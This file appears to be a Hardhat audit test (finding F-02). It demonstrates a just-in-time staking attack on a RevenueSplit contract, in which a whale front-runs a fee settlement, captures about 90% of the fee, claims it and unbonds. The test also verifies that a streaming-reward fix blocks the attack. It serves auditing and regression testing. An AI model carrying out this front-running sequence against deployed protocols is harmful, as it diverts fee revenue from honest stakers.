// F-02 — Just-in-time staking steals staker fee revenue (RevenueSplit has no time component).
// RevenueSplit.notifyRevenue() adds amount·1e18/totalStaked to rewardIndex IMMEDIATELY, and
// claimReward() pays the index delta at once. A whale that stakes in the block before the
// House's fee-streaming settle (a public tx, front-runnable) captures a pro-rata share of
// that single fee event, then claims it and requests unbond. Principal is locked 7 days but
// the REWARD is instantly claimable: the honest long-term stakers are diluted.
const { expect } = require("../lib/expect");
const W_ = require("../lib/world");
const { ethers } = require("hardhat");
const { makeWorld, buyTicket, settleHouse, timeTravel, U, E18, X, SET, isFixed } = W_;

describe(`F-02 JIT stake reward theft [set=${SET}]`, function () {
  this.timeout(600000);

  it("attacker staking 9x the honest stake right before a fee event takes ~90% of the fee", async () => {
    const W = await makeWorld({ withOptions: false, classCap: U(50_000) });
    const { owner, lp, p1, relayer } = W.signers;
    const honest = W.signers.p2, attacker = W.signers.p3;

    await (await W.house.connect(lp).lpDeposit(U(100_000))).wait();
    // DIAMOND: owner mints to honest staker + attacker (demo genesis-style allocation)
    await (await W.diamond.setMinter(owner.address)).wait();
    await (await W.diamond.mint(honest.address, E18(10_000))).wait();
    await (await W.diamond.mint(attacker.address, E18(90_000))).wait();
    // honest staker is in place long before the event
    await (await W.diamond.connect(honest).approve(W.sA, ethers.MaxUint256)).wait();
    await (await W.sink.connect(honest).stake(E18(10_000))).wait();
    await (await W.diamond.connect(attacker).approve(W.sA, ethers.MaxUint256)).wait();

    // a winning ticket is sold and then settled; the settle streams 3% of profit to stakers
    const id = await buyTicket(W, p1, 10_000, 2);     // profit 10,000 → fee 399 USDC
    // ── attacker front-runs the settle: stake 90,000 DIAMOND in the block BEFORE it ──
    await (await W.sink.connect(attacker).stake(E18(90_000))).wait();
    await (await settleHouse(W, id, 1)).wait();       // WON → _streamFee → notifyRevenue
    // attacker claims immediately and exits the principal request (7-day lock)
    const bBefore = await W.usdc.balanceOf(attacker.address);
    const c1 = await W.sink.claimable(attacker.address);
    await (await W.sink.connect(attacker).claimReward()).wait();
    const gotAttacker = (await W.usdc.balanceOf(attacker.address)) - bBefore;
    await (await W.sink.connect(attacker).requestUnbond(E18(90_000))).wait();

    // let the 7-day stream run out; the attacker has already left (principal in unbonding)
    await timeTravel(7 * 24 * 3600 + 60);
    await (await W.sink.connect(honest).claimReward()).wait();
    const honestGot = await W.usdc.balanceOf(honest.address);
    const honestEarned = honestGot - U(1_000_000);    // honest started with 1M USDC minted

    console.log(`  [EVIDENCE] fee streamed to stakers (rewardIndex delta) ≈ 399 USDC`);
    console.log(`  [EVIDENCE] attacker (90k DIAMOND, staked 0s) claimable=${c1} paid=${gotAttacker} (base units, 6dp)`);
    console.log(`  [EVIDENCE] honest (10k DIAMOND, staked since genesis) earned=${honestEarned} (base units, 6dp) after the 7d stream`);
    const attackerShare = Number(gotAttacker) / Number(gotAttacker + honestEarned);
    console.log(`  [EVIDENCE] attacker share of the single fee event = ${(attackerShare * 100).toFixed(2)}%`);

    if (!isFixed()) {
      expect(attackerShare).gt(0.85);              // reproduces: ~90% stolen by a 0-second staker
    } else {
      // streaming rewards: nothing is claimable at the instant of the event
      expect(gotAttacker).lt(1_000n);              // < 0.001 USDC immediately
      expect(c1).lt(1_000n);
      // …and the attacker's principal leaves at once, so the honest staker captures the stream
      expect(honestEarned > U(398)).to.equal(true);   // ≈ the whole 399 USDC fee
    }
  });
});
